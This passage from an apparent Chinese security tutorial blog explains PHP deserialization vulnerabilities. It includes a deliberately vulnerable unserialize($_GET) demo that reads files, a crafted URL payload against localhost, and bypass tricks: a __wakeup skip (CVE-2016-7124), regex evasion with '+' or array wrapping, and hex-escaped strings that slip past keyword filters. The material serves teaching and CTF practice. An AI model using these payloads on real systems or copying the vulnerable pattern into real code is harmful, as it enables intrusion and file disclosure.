class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a;<br><br></code></pre></td></tr></table></figure><h5 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;set&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-number">6</span>;<br><br></code></pre></td></tr></table></figure><h5 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;set&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-number">6</span>;<br><br></code></pre></td></tr></table></figure><p>经过测试发现empty方法是不可以的</p><h5 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;unset&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>-&gt;a);<br></code></pre></td></tr></table></figure><h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;string&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;string&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>;<br><br></code></pre></td></tr></table></figure><h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;string&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><br><br></code></pre></td></tr></table></figure><h4 id="一个实例"><a href="#一个实例" class="headerlink" title="一个实例"></a>一个实例</h4><p>现在开始这个小实验，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test9.php&#x27;</span>;<br><span class="hljs-variable">$fileobj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fileclass</span>();<br><span class="hljs-variable">$fileobj</span>-&gt;filename = <span class="hljs-string">&#x27;hello.txt&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$fileobj</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test8.php</span><br></code></pre></td></tr></table></figure><p>我们先访问test8.php，结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fileclass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;error.log&#x27;</span>;<br>    <span class="hljs-comment">//当对象被作为一个字符串会读取这个文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//class data</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//允许对象作为一个字符串输出上面的data</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;user &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//用户可控</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br><span class="hljs-comment">//输出__toString</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test9.php</span><br></code></pre></td></tr></table></figure><p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：<code>http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</code><br>访问：<br><img src="https://img-blog.csdnimg.cn/20190323122744234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220321210523070.png" alt="image-20220321210523070"></p><h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><p>PHP中把以<strong>两个下划线</strong><code>__</code>开头的方法称为<strong>魔术方法</strong>(Magic methods)<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">PHP官方——魔术方法</a><br><a href="https://www.cnblogs.com/wwlww/p/8413418.html">PHP中16 个魔术方法详解</a></p><p>类可能会包含一些特殊的函数：magic函数，这些函数在某些情况下会<strong>自动调用</strong>。</p><p>serialize() 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><code>__construct</code>：构造函数，当一个对象<strong>创建</strong>时调用</p><p><code>__destruct</code>：析构函数，当一个对象<strong>被销毁</strong>时调用</p><p><code>__toString</code>：当一个对象<strong>被当作一个字符串</strong>时使用</p><p><code>__sleep</code>：在对象<strong>序列化</strong>的时候调用</p><p><code>__wakeup</code>：对象重新醒来，即<strong>由二进制串重新组成一个对象</strong>的时候（在一个对象被<strong>反序列化</strong>时调用）</p><p>从序列化到反序列化这几个函数的执行过程是：<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code></p><h4 id="补充几个用例"><a href="#补充几个用例" class="headerlink" title="补充几个用例"></a>补充几个用例</h4><p><img src="D:/mdimage/1344396-20200929174704829-1177244300.png" alt="img"> </p><h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p><p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h3><h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="(CVE-2016-7124)"></a>(CVE-2016-7124)</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">版本：<br> PHP5 &lt; 5.6.25<br> PHP7 &lt; 7.0.10<br></code></pre></td></tr></table></figure><p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p><p>对于下面这样一个自定义类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>666</code></p><p>而把对象属性个数的值增大执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>abc</code></p><h4 id="PHP-Bug-81151-2021-06-17"><a href="#PHP-Bug-81151-2021-06-17" class="headerlink" title="PHP Bug 81151(2021-06-17)"></a>PHP Bug 81151(2021-06-17)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;construct&quot;</span>;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;E&quot;:0:&#123;&#125;destruct&#x27;</span>);<span class="hljs-comment">//正常的全触发</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>);<span class="hljs-comment">//不触发wake up</span><br><br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20221015210753313.png" alt="image-20221015210753313"> </p><p>这样不会触发construct,wake up</p><h4 id="PHP-Bug-81153-2021-06-17"><a href="#PHP-Bug-81153-2021-06-17" class="headerlink" title="PHP Bug 81153(2021-06-17)"></a>PHP Bug 81153(2021-06-17)</h4><p>官方是这样描述的<br> bad unserialize string makes <code>__wakeup</code> ineffective.</p><h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p><p>利用加号绕过（注意在url里传参时+要编码为%2B）<br><code>serialize(array(a ) ) ; / / a));//a));//a</code>为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a.PHP_EOL;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">match</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you lose!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br><span class="hljs-comment">// +号绕过</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-keyword">match</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-comment">// serialize(array($a));</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br></code></pre></td></tr></table></figure><p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;%00*%00a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;%00test%00b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;def&quot;</span>;&#125;<br>可以写成<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;S:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;\00*\00\61&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;%00test%00b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;def&quot;</span>;&#125;<br>表示字符类型的s大写时，会被当成<span class="hljs-number">16</span>进制解析。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>; <br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <br><br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;admin&#x27;</span>; <br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <br><br><span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>; <br><br>&#125; <br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;username&#x27;</span>)!==False)&#123; <br><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;你绕不过！！&quot;</span>.PHP_EOL); <br><br>&#125;<br><br><span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>; <br><br>&#125; <br><br>&#125;<br><br><span class="hljs-comment">// 未作处理前 </span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>; <br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>); <br><br><span 